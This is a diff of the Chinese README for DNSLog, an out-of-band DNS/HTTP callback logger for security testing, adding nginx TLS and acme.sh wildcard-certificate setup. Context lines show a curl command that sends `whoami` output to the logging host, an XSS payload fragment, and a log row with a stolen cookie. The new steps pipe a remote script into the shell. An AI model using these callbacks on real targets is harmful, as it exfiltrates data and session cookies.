@@ -15,7 +15,7 @@ DNSLog 是四叶草安全旗下 BugscanTeam 打造的一款监控 DNS 解析记�
 
 DNSLog 基于 Django 框架编写，将 DNSServer 集成进 DNSLog 中，使用者可轻松搭建使用环境。
 
-你可以点击这里访问： [演示站点](http://admin.dnslog.link)
+你可以点击这里访问： [演示站点](https://admin.dnslog.link)
 
 安装
 ---
@@ -44,42 +44,42 @@ DNSLog 基于 Django 框架编写，将 DNSServer 集成进 DNSLog 中，使用�
  $ pip install -r requirements.pip
  ```
 3. 域名与公网 IP 准备
-	
-	搭建并使用 DNSLog，你需要拥有两个域名，一个域名作为 NS 服务器域名(例:a.com)，一个用于记录域名(例: b.com)。还需要有一个公网 IP 地址(如：1.1.1.1)
-	
-	**注意：b.com 的域名提供商需要支持自定义 NS 记录, a.com 则无要求。**
-	
-	1. 在 a.com 中设置两条 A 记录：
+    
+    搭建并使用 DNSLog，你需要拥有两个域名，一个域名作为 NS 服务器域名(例:a.com)，一个用于记录域名(例: b.com)。还需要有一个公网 IP 地址(如：1.1.1.1)
+    
+    **注意：b.com 的域名提供商需要支持自定义 NS 记录, a.com 则无要求。**
+    
+    1. 在 a.com 中设置两条 A 记录：
 
-		```
-		ns1.a.com  A 记录指向  1.1.1.1		
-		ns2.a.com  A 记录指向  1.1.1.1
-		```
-	2. 修改 b.com 的 NS 记录为 1 中设定的两个域名
+        ```
+        ns1.a.com  A 记录指向  1.1.1.1        
+        ns2.a.com  A 记录指向  1.1.1.1
+        ```
+    2. 修改 b.com 的 NS 记录为 1 中设定的两个域名
 
-		> 本步骤中，需要在域名提供商提供的页面进行设置，部分域名提供商只允许修改 NS 记录为已经认证过的 NS 地址。所以需要找一个支持修改 NS 记录为自己 NS 的域名提供商。
-	
-	**注意: NS 记录修改之后部分地区需要 24-48 小时会生效**
+        > 本步骤中，需要在域名提供商提供的页面进行设置，部分域名提供商只允许修改 NS 记录为已经认证过的 NS 地址。所以需要找一个支持修改 NS 记录为自己 NS 的域名提供商。
+    
+    **注意: NS 记录修改之后部分地区需要 24-48 小时会生效**
 
 4. 修改配置文件
-	
+    
  修改 `dnslog/dnslog/settings.py` 文件中相关配置：
  
  > 配置文件中的域名对应关系与步骤 3 相同
  
  ```
-	# 做 dns 记录的域名
-	DNS_DOMAIN = 'b.com'
-	
-	# 记录管理的域名, 这里前缀根据个人喜好来定
-	ADMIN_DOMAIN = 'admin.b.com'
-	
-	# NS域名
-	NS1_DOMAIN = 'ns1.a.com'
-	NS2_DOMAIN = 'ns2.a.com'
-	
-	# 服务器外网地址
-	SERVER_IP = '1.1.1.1'
+    # 做 dns 记录的域名
+    DNS_DOMAIN = 'b.com'
+    
+    # 记录管理的域名, 这里前缀根据个人喜好来定
+    ADMIN_DOMAIN = 'admin.b.com'
+    
+    # NS域名
+    NS1_DOMAIN = 'ns1.a.com'
+    NS2_DOMAIN = 'ns2.a.com'
+    
+    # 服务器外网地址
+    SERVER_IP = '1.1.1.1'
  ```
 
 5. 启动服务
@@ -95,22 +95,54 @@ DNSLog 基于 Django 框架编写，将 DNSServer 集成进 DNSLog 中，使用�
  
  Nginx 反向代理参考脚本：
  
- ```
-	server {
-	    server_name *.b.com;
-	    server_name b.com;
-	    location / {
-	        proxy_pass http://127.0.0.1:8000/;
-	                proxy_set_header Host $host;
-	                proxy_set_header X-Real-IP $remote_addr;
-	                proxy_set_header X-Forwarded-For $remote_addr;
-	                proxy_set_header X-Forwarded-Proto https;
-	    }
-	}
- ```
+```nginx
+server {
+        listen 443;
+        ssl on;
+        ssl_certificate /etc/nginx/certs/*.xxx.com/fullchain;
+        ssl_certificate_key /etc/nginx/certs/*.xxx.com/key;
+        server_name *.hackhttp.com;
+        location /static {
+                alias /var/www/dnslog/static;
+        }
+        location / {
+                proxy_pass http://127.0.0.1:8000/;
+                proxy_redirect off;
+                proxy_set_header Host $host;
+                proxy_set_header X-Real-IP $remote_addr;
+                proxy_set_header X-Forwarded-For $remote_addr;
+                proxy_set_header X-Forwarded-Proto $scheme;
+        }
 
+}
+```
 
-使用
+6. https泛证书申请(let's encrypt)
+
+    1. 安装acme `curl  https://get.acme.sh | sh`
+    1. 单独启动dns服务器 `python zoneresolver.py`
+    1. 添加acme的api脚本
+        ```bash
+        cp acme.sh/dns_log.sh /root/.acme.sh/dnsapi/dns_log.sh
+        chmod +x /root/.acme.sh/dnsapi/dns_log.sh
+        ```
+    1. 申请证书
+
+        `acme.sh --issue -d "*.xxx.com" --dns dns_log --debug --dnssleep 10`
+
+    1. 安装证书
+
+        ```bash
+        mkdir -p /etc/nginx/certs/\*.xxx.com/
+        acme.sh --install-cert -d \*.xxx.com \
+        --cert-file /etc/nginx/certs/\*.xxx.com/cert \
+        --key-file /etc/nginx/certs/\*.xxx.com/key \
+        --fullchain-file /etc/nginx/certs/\*.xxx.com/fullchain \
+        --reloadcmd "nginx -s reload"
+        ```
+
+    acme会自动检查证书是否过期，当申请到新证书后也会自动重启nginx让证书生效
+
 ---
 
 ### 站点管理
@@ -146,9 +178,9 @@ curl "http://testhash.test.dnslog.link/?`whoami`"
 
 **在 Web 控制台下看到结果：**
 
-\#	|	path	|	ip	|	ua	| date
+\#    |    path    |    ip    |    ua    | date
 ---|---|---|---|---
-146	| testhash.test.dnslog.link/?root |	xxx.xxx.xxx.xxx |	curl/7.43.0	| 2016-05-10 07:36:47
+146    | testhash.test.dnslog.link/?root |    xxx.xxx.xxx.xxx |    curl/7.43.0    | 2016-05-10 07:36:47
 
 
 ### DNS记录中获取源IP地址
@@ -185,9 +217,9 @@ document.head.appendChild(s);
 
 以 `httpbin.org` 为例，一旦触发，在 WebLog 中可以看到：
 
-\#	|	path	|	ip	|	ua	| date
+\#    |    path    |    ip    |    ua    | date
 ---|---|---|---|---
-146	| xss.test.dnslog.link/?url=http://httpbin.org/&cookie=_ga=GA1.2.17.142 |	xxx.xxx.xxx.xxx |	Mozilla/5.0 xxx	| 2016-06-18
+146    | xss.test.dnslog.link/?url=http://httpbin.org/&cookie=_ga=GA1.2.17.142 |    xxx.xxx.xxx.xxx |    Mozilla/5.0 xxx    | 2016-06-18
 
 
 相关链接
